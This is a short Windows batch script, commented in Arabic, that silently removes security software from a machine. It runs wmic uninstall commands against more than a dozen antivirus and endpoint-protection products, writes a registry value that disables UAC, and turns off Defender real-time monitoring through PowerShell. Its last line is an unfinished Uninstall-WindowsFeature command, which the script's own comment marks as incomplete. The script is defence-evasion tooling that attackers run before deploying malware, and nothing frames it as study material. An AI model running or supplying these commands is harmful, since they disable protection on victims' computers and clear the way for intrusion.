@echo off
rem أوامر إلغاء تثبيت برامج الحماية والأمان صامتاً
start wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive
start wmic product where name="Symantec Endpoint Protection" call uninstall /nointeractive
start wmic product where name="AVG 2015" call uninstall /nointeractive
start wmic product where name="McAfee VirusScan Enterprise" call uninstall /nointeractive
start wmic product where name="McAfee Agent" call uninstall /nointeractive
start wmic product where name="McAfee DLP Endpoint" call uninstall /nointeractive
start wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive
start wmic product where name="McAfee Endpoint Security Threat Prevention" call uninstall /nointeractive
start wmic product where name="Microsoft Security Client" call uninstall /nointeractive
start wmic product where name="Malwarebytes' Managed Client" call uninstall /nointeractive
start wmic product where name="Sophos System Protection" call uninstall /nointeractive
start wmic product where name="Sophos AutoUpdate" call uninstall /nointeractive
start wmic product where name="Sophos Remote Management System" call uninstall /nointeractive
start wmic product where name="McAfee SiteAdvisor Enterprise" call uninstall /nointeractive
start wmic product where name="Symantec Backup Exec Remote Agent for Windows" call uninstall /nointeractive
start wmic product where name="ESET File Security" call uninstall /nointeractive

rem أمر تعديل سجل النظام لتعطيل UAC (يتطلب إعادة تشغيل الجهاز لتطبيقه)
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

rem أوامر PowerShell لتعطيل الحماية الفورية وإزالة ميزات النظام (الأمر الأخير غير مكتمل)
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Uninstall-WindowsFeature -Name
